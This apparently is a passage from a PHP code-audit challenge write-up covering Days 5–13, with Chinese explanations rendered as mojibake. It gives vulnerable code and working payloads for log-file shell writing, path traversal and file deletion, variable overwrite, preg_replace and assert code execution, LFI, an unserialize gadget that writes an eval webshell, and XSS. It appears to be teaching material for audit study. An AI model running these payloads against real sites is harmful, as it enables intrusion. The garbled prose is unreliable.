<p>åœ¨Linuxç³»ç»Ÿä¸Šï¼Œ <strong>php</strong> çš„ <strong>mail</strong> å‡½æ•°åœ¨åº•å±‚ä¸­å·²ç»å†™å¥½äº†ï¼Œé»˜è®¤è°ƒç”¨ <strong>Linux</strong> çš„ <strong><a href="http://www.sendmail.com/">sendmail</a></strong> ç¨‹åºå‘é€é‚®ä»¶ã€‚è€Œåœ¨é¢å¤–å‚æ•°( <strong>additional_parameters</strong> )ä¸­ï¼Œ <strong>sendmail</strong> ä¸»è¦æ”¯æŒçš„é€‰é¡¹æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p>
<blockquote>
<ul>
<li><p>-O option = value</p>
<p>QueueDirectory = queuedir é€‰æ‹©é˜Ÿåˆ—æ¶ˆæ¯</p>
</li>
<li><p>-X logfile</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥æŒ‡å®šä¸€ä¸ªç›®å½•æ¥è®°å½•å‘é€é‚®ä»¶æ—¶çš„è¯¦ç»†æ—¥å¿—æƒ…å†µã€‚</p>
</li>
<li><p>-f from email</p>
<p>è¿™ä¸ªå‚æ•°å¯ä»¥è®©æˆ‘ä»¬æŒ‡å®šæˆ‘ä»¬å‘é€é‚®ä»¶çš„é‚®ç®±åœ°å€ã€‚</p>
</li>
</ul>
</blockquote>
<p>eg:</p>
<pre><code class="php">&lt;?php
  $to = &#39;Alice@example.com&#39;;
    $subject = &#39;Hello Alice!&#39;;
    $message = &#39;&lt;?php phpinfo(); ?&gt;&#39;;
    $header = &#39;CC: somebodyelse@example.com&#39;;
    $options = &#39;-OQueueDirectory = /tmp -X /var/www/html/shell.php&#39;;
    mail($to, $subject, $message, $header, $options);
?&gt;</code></pre>
<p>ä¸Šé¢è¿™ä¸ªæ ·ä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <strong>-X</strong> å‚æ•°æŒ‡å®šæ—¥å¿—æ–‡ä»¶ï¼Œæœ€ç»ˆä¼šåœ¨ <strong>/var/www/html/rce.php</strong> ä¸­å†™å…¥å¦‚ä¸‹æ•°æ®ï¼š</p>
<pre><code>17220 &lt;&lt;&lt; To: Alice@example.com
 17220 &lt;&lt;&lt; Subject: Hello Alice!
 17220 &lt;&lt;&lt; X-PHP-Originating-Script: 0:test.php
 17220 &lt;&lt;&lt; CC: somebodyelse@example.com
 17220 &lt;&lt;&lt;
 17220 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt;
 17220 &lt;&lt;&lt; [EOF]</code></pre>
<p>ç„¶åæ˜¯è¿‡æ»¤å‡½æ•°ï¼Œè¿™é‡Œ<strong>escapeshellcmd()</strong> å’Œ <strong>escapeshellarg</strong> ä¸€èµ·ä½¿ç”¨ï¼Œä¼šé€ æˆç‰¹æ®Šå­—ç¬¦é€ƒé€¸ã€‚</p>
<p>å‚è€ƒï¼š</p>
<blockquote>
<p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md</a></p>
<p><a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php">https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php</a></p>
<p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
</blockquote>
<h2 id="Day-6-Frost-Pattern"><a href="#Day-6-Frost-Pattern" class="headerlink" title="Day 6 - Frost Pattern"></a>Day 6 - Frost Pattern</h2><p><strong>code:</strong></p>
<pre><code class="php">class TokenStorage &#123;
    public function performAction($action, $data) &#123;
        switch ($action) &#123;
            case &#39;create&#39;:
                $this-&gt;createToken($data);
                break;
            case &#39;delete&#39;:
                $this-&gt;clearToken($data);
                break;
            default:
                throw new Exception(&#39;Unknown action&#39;);
        &#125;
    &#125;

    public function createToken($seed) &#123;
        $token = md5($seed);
        file_put_contents(&#39;/tmp/tokens/&#39; . $token, &#39;...data&#39;);
    &#125;

    public function clearToken($token) &#123;
        $file = preg_replace(&quot;/[^a-z.-_]/&quot;, &quot;&quot;, $token);
        unlink(&#39;/tmp/tokens/&#39; . $file);
    &#125;
&#125;

$storage = new TokenStorage();
$storage-&gt;performAction($_GET[&#39;action&#39;], $_GET[&#39;data&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>æ­£åˆ™è¡¨è¾¾å¼æœ‰é—®é¢˜ï¼Œå¼€å‘è€…æœ¬æ¥çš„æ„æ€åº”è¯¥æ˜¯å°†<code>a-z</code>å’Œ<code>.-_</code>è¿™ä¸‰ä¸ªç¬¦å·å¤–çš„å…¨éƒ¨æ›¿æ¢ä¸ºç©ºï¼Œè¿™æ ·<code>../../../xx</code>å°±æ— æ³•ä½¿ç”¨ï¼Œé˜²æ­¢è¿›è¡Œè·¯å¾„ç©¿è¶Šã€‚ä½†æ˜¯æ²¡å¯¹<code>-</code>è¿›è¡Œè½¬ä¹‰ï¼Œæ‰€ä»¥åŒ¹é…èŒƒå›´å°±å˜æˆäº†<code>a-z</code>å’Œ<code>.</code> å­—ç¬¦åˆ° <code>_</code> å­—ç¬¦ä¹‹é—´çš„æ‰€æœ‰å­—ç¬¦ã€‚</p>
<table>
<thead>
<tr>
<th align="left">æ­£åˆ™è¡¨è¾¾å¼</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">[^a-zA-Z]</td>
<td align="left">å®ƒåŒ¹é…ä»»ä½•ä¸åŒ…å«ä»aåˆ°zã€Aåˆ°Zçš„å­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚</td>
</tr>
</tbody></table>
<pre><code>&gt;&gt;&gt; ord(&#39;.&#39;)
46
&gt;&gt;&gt; ord(&#39;_&#39;)
95
&gt;&gt;&gt; ord(&#39;/&#39;)
47</code></pre>
<p>å®Œç¾é¿å¼€äº†<code>../</code>å­—ç¬¦ï¼Œè¿™æ ·å°±é€ æˆäº†ç›®å½•ç©¿è¶Šï¼Œä¸Šé¢ä»£ç å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤äº†ã€‚</p>
<p>payloadï¼š</p>
<pre><code>action=delete&amp;data=../../config.php</code></pre>
<h2 id="Day-7-Bells"><a href="#Day-7-Bells" class="headerlink" title="Day 7 - Bells"></a>Day 7 - Bells</h2><p><strong>code:</strong></p>
<pre><code class="php">function getUser($id) &#123;
    global $config, $db;
    if (!is_resource($db)) &#123;
        $db = new MySQLi(
            $config[&#39;dbhost&#39;],
            $config[&#39;dbuser&#39;],
            $config[&#39;dbpass&#39;],
            $config[&#39;dbname&#39;]
        );
    &#125;
    $sql = &quot;SELECT username FROM users WHERE id = ?&quot;;
    $stmt = $db-&gt;prepare($sql);
    $stmt-&gt;bind_param(&#39;i&#39;, $id);
    $stmt-&gt;bind_result($name);
    $stmt-&gt;execute();
    $stmt-&gt;fetch();
    return $name;
&#125;

$var = parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);
parse_str($var[&#39;query&#39;]);
$currentUser = getUser($id);
echo &#39;&lt;h1&gt;&#39;.htmlspecialchars($currentUser).&#39;&lt;/h1&gt;&#39;;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p><code>parse_str</code>å¯¼è‡´äº†å˜é‡è¦†ç›–æ¼æ´ï¼Œé€šè¿‡å®ƒå¯ä»¥è¦†ç›–æ‰<code>$config</code>å˜é‡ï¼Œä½¿æ•°æ®åº“é…ç½®ä¿¡æ¯å¯æ§ã€‚</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.parse-str.php"><strong>parse_str</strong></a></p>
<p><strong>åŠŸèƒ½</strong> ï¼šparse_strçš„ä½œç”¨å°±æ˜¯è§£æå­—ç¬¦ä¸²å¹¶ä¸”æ³¨å†Œæˆå˜é‡ï¼Œå®ƒåœ¨æ³¨å†Œå˜é‡ä¹‹å‰ä¸ä¼šéªŒè¯å½“å‰å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šç›´æ¥è¦†ç›–æ‰å½“å‰ä½œç”¨åŸŸä¸­åŸæœ‰çš„å˜é‡ã€‚</p>
<p><strong>å®šä¹‰</strong> ï¼š<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p>
<p>å¦‚æœ <strong>encoded_string</strong> æ˜¯ URL ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚</p>
</blockquote>
<p>Payload:</p>
<pre><code>http://host/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=test&amp;id=1</code></pre>
<h2 id="Day-8-Candle"><a href="#Day-8-Candle" class="headerlink" title="Day 8 - Candle"></a>Day 8 - Candle</h2><p><strong>code:</strong></p>
<pre><code class="php">header(&quot;Content-Type: text/plain&quot;);

function complexStrtolower($regex, $value) &#123;
    return preg_replace(
        &#39;/(&#39; . $regex . &#39;)/ei&#39;,
        &#39;strtolower(&quot;\\1&quot;)&#39;,
        $value
    );
&#125;

foreach ($_GET as $regex =&gt; $value) &#123;
    echo complexStrtolower($regex, $value) . &quot;\n&quot;;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>ï¼š(PHP 5.5)</p>
<p><strong>åŠŸèƒ½</strong> ï¼š å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p>
<p><strong>å®šä¹‰</strong> ï¼š <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
<p>æœç´¢ <strong>subject</strong> ä¸­åŒ¹é… <strong>pattern</strong> çš„éƒ¨åˆ†ï¼Œ å¦‚æœåŒ¹é…æˆåŠŸä»¥ <strong>replacement</strong> è¿›è¡Œæ›¿æ¢</p>
</blockquote>
<p>å¯¼è‡´é—®é¢˜å‡ºåœ¨<code>/e</code>ä¸Šï¼Œ/e ä¿®æ­£ç¬¦ä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç æ‰§è¡Œï¼ˆåœ¨é€‚å½“çš„é€†å‘å¼•ç”¨æ›¿æ¢å®Œä¹‹åï¼‰ã€‚ç¬¬äºŒä¸ªå‚æ•°å³ç”¨æ¥æ›¿æ¢çš„å‚æ•°æ˜¯<code>strtolower(&quot;\\1&quot;)</code>ï¼Œ<code>strtolower</code>æ˜¯è½¬æ¢å°å†™å­—æ¯çš„å‡½æ•°ï¼Œ<code>\\1</code>è¡¨ç¤ºæ­£åˆ™åŒ¹é…åˆ°çš„ç¬¬ä¸€ä¸ªå†…å®¹ï¼Œè¿™æ˜¯æ­£åˆ™è¡¨è¾¾å¼åå‘å¼•ç”¨çš„çŸ¥è¯†ã€‚</p>
<blockquote>
<p><strong>åå‘å¼•ç”¨</strong></p>
<p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ <strong>ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·</strong> å°†å¯¼è‡´ç›¸å…³ <strong>åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong> ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚</p>
</blockquote>
<p>ç°åœ¨å¯ç”¨çš„å‚æ•°æœ‰<code>preg_replace</code>çš„ç¬¬ä¸€ã€ä¸‰å‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶replacementå‚æ•°æ¥æ‰§è¡Œphpä»£ç ã€‚</p>
<p>æ­£åˆ™å‚æ•°ä½¿ç”¨<code>.*</code>æ¥åŒ¹é…ä»»ä½•å­—ç¬¦æ˜¯æœ€æ–¹ä¾¿çš„é€‰æ‹©ï¼Œä½†æ˜¯è¿™é‡Œé€šè¿‡GETä¼ å…¥åå‘ç°æ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•å­—ç¬¦ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ ä¸Šå»çš„<code>.*</code> å˜æˆäº† <code>_*</code>ï¼Œè¿™æ˜¯ç”±äºåœ¨PHPä¸­ï¼Œå¯¹äºä¼ å…¥çš„éæ³•çš„ <strong>$_GET</strong> æ•°ç»„å‚æ•°åï¼Œä¼šå°†å…¶è½¬æ¢æˆä¸‹åˆ’çº¿ï¼Œè¿™å°±å¯¼è‡´æˆ‘ä»¬æ­£åˆ™åŒ¹é…å¤±æ•ˆã€‚é‚£ä¹ˆå¯ä»¥æ¢ç”¨<code>\S*</code>æ¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœã€‚ï¼ˆ\Sï¼šç”¨äºåŒ¹é…é™¤å•ä¸ªç©ºæ ¼ç¬¦ä¹‹å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼‰</p>
<p>å†å°±æ˜¯è¦æ‰§è¡Œçš„PHPä»£ç ï¼Œè¦åŒ¹é…åˆ° <strong>{${phpinfo()}}**æ‰èƒ½æ‰§è¡Œ **phpinfo</strong> å‡½æ•°ã€‚è¿™å®é™…ä¸Šæ˜¯ <a href="http://php.net/manual/zh/language.variables.variable.php">PHPå¯å˜å˜é‡</a> çš„åŸå› ã€‚åœ¨PHPä¸­åŒå¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ä¸­å¯ä»¥è§£æå˜é‡ï¼Œè€Œå•å¼•å·åˆ™ä¸è¡Œã€‚ <strong>${phpinfo()}</strong> ä¸­çš„ <strong>phpinfo()</strong> ä¼šè¢«å½“åšå˜é‡å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œåï¼Œå³å˜æˆ <strong>${1}</strong> (phpinfo()æˆåŠŸæ‰§è¡Œè¿”å›true)ã€‚</p>
<p>Payload1:<code>/?.*=&#123;$&#123;phpinfo()&#125;&#125;</code>ï¼Œåˆ©ç”¨äº†åå‘å¼•ç”¨ï¼Œåœ¨ç›´æ¥å†™è¿›ä»£ç æ—¶å¯æˆåŠŸæ‰§è¡Œï¼Œä½†ç”±äºç‰¹æ®Šç¬¦å·<code>.</code>é€šè¿‡GETæ–¹æ³•ä¼ å…¥æ—¶ä¼šè¢«æ›¿æ¢ä¸º<code>_</code>ï¼Œä»è€Œå¯¼è‡´æ— æ³•æˆåŠŸåŒ¹é…ã€‚</p>
<p>æ‰€ä»¥æœ€åpayloadä¸ºï¼š<code>\S*=&#123;$&#123;phpinfo()&#125;&#125; </code></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
</blockquote>
<h2 id="Day-9-Rabbit"><a href="#Day-9-Rabbit" class="headerlink" title="Day 9 - Rabbit"></a>Day 9 - Rabbit</h2><p><strong>code:</strong></p>
<pre><code class="php">class LanguageManager
&#123;
    public function loadLanguage()
    &#123;
        $lang = $this-&gt;getBrowserLanguage();
        $sanitizedLang = $this-&gt;sanitizeLanguage($lang);
        require_once(&quot;/lang/$sanitizedLang&quot;);
    &#125;

    private function getBrowserLanguage()
    &#123;
        $lang = $_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;] ?? &#39;en&#39;;
        return $lang;
    &#125;

    private function sanitizeLanguage($language)
    &#123;
        return str_replace(&#39;../&#39;, &#39;&#39;, $language);
    &#125;
&#125;

(new LanguageManager())-&gt;loadLanguage();</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé—®é¢˜å‡ºåœ¨<code>str_replace(&#39;../&#39;, &#39;&#39;, $language)</code>ï¼Œé—®é¢˜å°±æ˜¯è¿™ä¸ªåŒ…å«åªæ˜¯å•æ¬¡æ›¿æ¢è€Œä¸æ˜¯å¾ªç¯æ›¿æ¢ï¼Œæ‰€ä»¥è¿™ç§æ›¿æ¢å°±å¾ˆå®¹æ˜“è¢«ç»•è¿‡ã€‚åªéœ€è¦å å†™ä¸€ä¸‹å°±å¥½äº†ï¼Œå¦‚<code>...//</code>ã€‚è€Œä¸”<code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code>è¿™ä¸ªå˜é‡æ˜¯å®¢æˆ·ç«¯å¯æ§çš„ã€‚</p>
<p>payloadï¼š</p>
<pre><code>Accept-Language:  .//....//....//etc/passwd</code></pre>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><p><strong>code:</strong></p>
<pre><code class="php">extract($_POST);

function goAway() &#123;
    error_log(&quot;Hacking attempt.&quot;);
    header(&#39;Location: /error/&#39;);
&#125;

if (!isset($pi) || !is_numeric($pi)) &#123;
    goAway();
&#125;

if (!assert(&quot;(int)$pi == 3&quot;)) &#123;
    echo &quot;This is not pi.&quot;;
&#125; else &#123;
    echo &quot;This might be pi.&quot;;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<blockquote>
<ol>
<li>ä½¿ç”¨header()è¿›è¡Œè·³è½¬çš„æ—¶å€™æ²¡æœ‰ä½¿ç”¨<code>exit()</code>æˆ–è€…æ˜¯<code>die()</code>ï¼Œå¯¼è‡´åç»­çš„ä»£ç ä»»ç„¶å¯ä»¥æ‰§è¡Œã€‚</li>
<li><code>assert()</code>èƒ½å¤Ÿæ‰§è¡Œ<code>&quot;</code>ä¸­çš„ä»£ç ,å¦‚<code>assert(&quot;(int)phpinfo()&quot;);</code></li>
</ol>
</blockquote>
<p>è¿™é“é¢˜ç›®å®é™…ä¸Šè®²çš„æ˜¯å½“æ£€æµ‹åˆ°æ”»å‡»æ—¶ï¼Œè™½ç„¶æœ‰ç›¸åº”çš„é˜²å¾¡æ“ä½œï¼Œä½†æ˜¯ç¨‹åºæœªç«‹å³åœæ­¢é€€å‡ºï¼Œå¯¼è‡´ç¨‹åºç»§ç»­æ‰§è¡Œçš„é—®é¢˜ã€‚ç¨‹åºåœ¨ <strong>ç¬¬ä¸€è¡Œå¤„</strong> ä½¿ç”¨ <strong>extract</strong> å‡½æ•°ï¼Œå°† <strong>POST</strong> è¯·æ±‚çš„æ•°æ®å…¨éƒ½æ³¨å†Œæˆå˜é‡ã€‚ç¨‹åºå¯¹ <strong>pi</strong> å˜é‡è¿›è¡Œç®€å•çš„éªŒè¯ï¼Œå¦‚æœä¸æ˜¯æ•°å­—æˆ–è€…æ²¡æœ‰è®¾ç½® <strong>pi</strong> å˜é‡ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <strong>goAway</strong> æ–¹æ³•ï¼Œå³è®°å½•é”™è¯¯ä¿¡æ¯å¹¶ç›´æ¥é‡å®šå‘åˆ° <strong>/error/</strong> é¡µé¢ã€‚ä½†æ˜¯å…³é”®åœ¨äºï¼Œç¨‹åºåœ¨å¤„ç†å®Œä¹‹åï¼Œæ²¡æœ‰ç«‹å³é€€å‡ºï¼Œè¿™æ ·ç¨‹åºåˆä¼šæŒ‰ç…§æµç¨‹æ‰§è¡Œä¸‹å»ï¼Œä¹Ÿå°±åˆ°äº† <strong>ç¬¬11è¡Œ</strong> çš„ <strong>assert</strong> è¯­å¥ã€‚ç”±äºå‰é¢ <strong>pi</strong> å˜é‡å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œæ‰€ä»¥åœ¨è¿™ä¸€è¡Œå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>ä¾‹å¦‚æˆ‘ä»¬çš„payloadä¸ºï¼š<strong>pi=phpinfo()</strong> ï¼Œç„¶åç¨‹åºå°±ä¼šæ‰§è¡Œè¿™ä¸ª <strong>phpinfo</strong> å‡½æ•°ã€‚ç”¨ <strong>BurpSuite</strong> ï¼Œå¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ç¨‹åºæ‰§è¡Œäº† <strong>phpinfo</strong> å‡½æ•°ã€‚</p>
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><p><strong>code:</strong></p>
<pre><code class="php">class Template &#123;
    public $cacheFile = &#39;/tmp/cachefile&#39;;
    public $template = &#39;&lt;div&gt;Welcome back %s&lt;/div&gt;&#39;;

    public function __construct($data = null) &#123;
        $data = $this-&gt;loadData($data);
        $this-&gt;render($data);
    &#125;

    public function loadData($data) &#123;
        if (substr($data, 0, 2) !== &#39;O:&#39; 
        &amp;&amp; !preg_match(&#39;/O:\d:/&#39;, $data)) &#123;
            return unserialize($data);
        &#125;
        return [];
    &#125;

    public function createCache($file = null, $tpl = null) &#123;
        $file = $file ?? $this-&gt;cacheFile;
        $tpl = $tpl ?? $this-&gt;template;
        file_put_contents($file, $tpl);
    &#125;

    public function render($data) &#123;
        echo sprintf(
            $this-&gt;template,
            htmlspecialchars($data[&#39;name&#39;])
        );
    &#125;

    public function __destruct() &#123;
        $this-&gt;createCache();
    &#125;
&#125;

new Template($_COOKIE[&#39;data&#39;]);</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>ä»£ç ä¸­çš„<code>??</code>æ˜¯php7ä¸­æ–°çš„è¯­æ³•ç³–ã€‚<code>??</code>çš„å«ä¹‰æ˜¯</p>
<blockquote>
<p>ç”±äºæ—¥å¸¸ä½¿ç”¨ä¸­å­˜åœ¨å¤§é‡åŒæ—¶ä½¿ç”¨ä¸‰å…ƒè¡¨è¾¾å¼å’Œ isset()çš„æƒ…å†µï¼Œ æˆ‘ä»¬æ·»åŠ äº†nullåˆå¹¶è¿ç®—ç¬¦ (??) è¿™ä¸ªè¯­æ³•ç³–ã€‚å¦‚æœå˜é‡å­˜åœ¨ä¸”å€¼ä¸ä¸ºNULLï¼Œ å®ƒå°±ä¼šè¿”å›è‡ªèº«çš„å€¼ï¼Œå¦åˆ™è¿”å›å®ƒçš„ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚</p>
</blockquote>
<p>è¿™é“é¢˜ç›®ä½¿ç”¨äº†<code>unserialize()</code>å’Œ<code>__destruct</code>ï¼Œæ˜¯è€ƒå¯Ÿååºåˆ—åŒ–æ¼æ´çš„å…¸å‹å¥—è·¯ã€‚é¢˜ç›®çš„æœ¬æ„å¾ˆç®€å•ï¼Œå°†é¡µé¢ä¸Šçš„å†…å®¹<code>Welcome back %s</code>æœ€åè¾“å‡ºåˆ°<code>/tmp/cachefile</code>æ–‡ä»¶ä¸­ã€‚è€Œé¢˜ç›®æœ€å¤§çš„é—®é¢˜æ˜¯éœ€è¦ç»•è¿‡ï¼š</p>
<ol>
<li><code>substr($data, 0, 2) !== &#39;O:&#39;</code></li>
<li><code>preg_match(&#39;/O:\d:/&#39;, $data)</code></li>
</ol>
<p>ç¬¬ä¸€ä¸ªé€šè¿‡æ•°ç»„çš„æ–¹å¼å°±å¯ä»¥ç»•è¿‡ï¼Œè€Œç¬¬äºŒä¸ªçš„ç»•è¿‡åˆ™éœ€è¦åˆ©ç”¨åˆ°PHPä¸­çš„ååºåˆ—åŒ–çš„ä¸€ä¸ªBUGï¼Œåªéœ€è¦åœ¨å¯¹è±¡é•¿åº¦å‰æ·»åŠ ä¸€ä¸ª+å·ï¼Œå³o:14-&gt;o:+14ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚å…³äºè¿™ä¸ªBUGçš„å…·ä½“åˆ†æï¼Œå¯ä»¥å‚è§<a href="http://www.phpbug.cn/archives/32.html">phpååºåˆ—unserializeçš„ä¸€ä¸ªå°ç‰¹æ€§</a>ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ payloadäº†ï¼š</p>
<pre><code class="php">class Template &#123;
    public $cacheFile = &#39;/var/www/html/shell.php&#39;;
    public $template = &#39;&lt;?php eval($_POST[xx]);?&gt;&#39;;
&#125;
$mytemp = new Template();
$myarray = array($mytemp);
$myarray = serialize($myarray);
var_dump($myarray);</code></pre>
<pre><code>string(124) &quot;a:1:&#123;i:0;O:8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;&quot;</code></pre>
<p>ç”±äºéœ€è¦ç»•è¿‡<code>preg_match(&#39;/O:\d:/&#39;, $data)</code>ï¼Œéœ€è¦å°†<code>O:8</code>å˜ä¸º<code>O:+8</code>,åˆ™æœ€åçš„payloadä¸ºï¼š</p>
<pre><code class="php">a:1:&#123;i:0;O:+8:&quot;Template&quot;:2:&#123;s:9:&quot;cacheFile&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:8:&quot;template&quot;;s:25:&quot;&lt;?php eval($_POST[xx]);?&gt;&quot;;&#125;&#125;</code></pre>
<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><p><strong>code:</strong></p>
<pre><code class="php">$sanitized = [];

foreach ($_GET as $key =&gt; $value) &#123;
    $sanitized[$key] = intval($value);
&#125;

$queryParts = array_map(function ($key, $value) &#123;
    return $key . &#39;=&#39; . $value;
&#125;, array_keys($sanitized), array_values($sanitized));

$query = implode(&#39;&amp;&#39;, $queryParts);

echo &quot;&lt;a href=&#39;/images/size.php?&quot; .
    htmlentities($query) . &quot;&#39;&gt;link&lt;/a&gt;&quot;;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>æœ¬é¢˜ç›®çš„å…³é”®æ˜¯åœ¨äº<code>$sanitized[$key] = intval($value);</code>ï¼ŒåŒæ—¶æ¼æ´ä¹Ÿæ˜¯å‡ºè‡ªäº<code>$sanitized[$key] = intval($value);</code>ã€‚è¿™è¡Œä»£ç ä¸»è¦å°±æ˜¯çš„ä½œç”¨å°±æ˜¯ä¼ å…¥çš„<code>$value</code>è¿›è¡Œè¿‡æ»¤å˜ä¸º<code>intval($value)</code>ï¼Œä¹‹åå†æ¬¡ç»è¿‡<code>htmlentities</code>è¿›è¡Œè¿‡æ»¤æ‹¼æ¥åˆ°<code>&lt;a&gt;</code>æ ‡ç­¾ä¸­ä½œä¸º<code>/images/size.php</code>çš„å‚æ•°ã€‚</p>
<p>ä¸Šè¿°ä»£ç çš„é—®é¢˜åœ¨äºï¼š</p>
<ol>
<li><code>$sanitized[$key] = intval($value)</code>åªè¿‡æ»¤äº†valueï¼Œæ²¡æœ‰å¯¹keyè¿›è¡Œè¿‡æ»¤ï¼›</li>
<li><code>htmlentities</code>é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šå¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚</li>
</ol>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„XSSæ”»å‡»å°±å¯ä»¥é€šè¿‡åœ¨æ ‡ç­¾<code>&lt;a&gt;</code>ä¸­å¢åŠ ä¸€ä¸ª<code>onclick</code>çš„ç‚¹å‡»äº‹ä»¶è§¦å‘ã€‚æœ€åçš„payloadå¦‚ä¸‹<code>/?a&#39;onclick%3dalert(1)%2f%2f=c</code></p>
<h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><p><strong>code:</strong></p>
<pre><code class="php">class LoginManager &#123;
    private $em;
    private $user;
    private $password;

    public function __construct($user, $password) &#123;
        $this-&gt;em = DoctrineManager::getEntityManager();
        $this-&gt;user = $user;
        $this-&gt;password = $password;
    &#125;

    public function isValid() &#123;
        $user = $this-&gt;sanitizeInput($this-&gt;user);
        $pass = $this-&gt;sanitizeInput($this-&gt;password);

        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()
            -&gt;select(&quot;COUNT(p)&quot;)
            -&gt;from(&quot;User&quot;, &quot;u&quot;)
            -&gt;where(&quot;user = &#39;$user&#39; AND password = &#39;$pass&#39;&quot;);
        $query = $queryBuilder-&gt;getQuery();
        return boolval($query-&gt;getSingleScalarResult());
    &#125;

    public function sanitizeInput($input, $length = 20) &#123;
        $input = addslashes($input);
        if (strlen($input) &gt; $length) &#123;
            $input = substr($input, 0, $length);
        &#125;
        return $input;
    &#125;
&#125;

$auth = new LoginManager($_POST[&#39;user&#39;], $_POST[&#39;passwd&#39;]);
if (!$auth-&gt;isValid()) &#123;
    exit;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
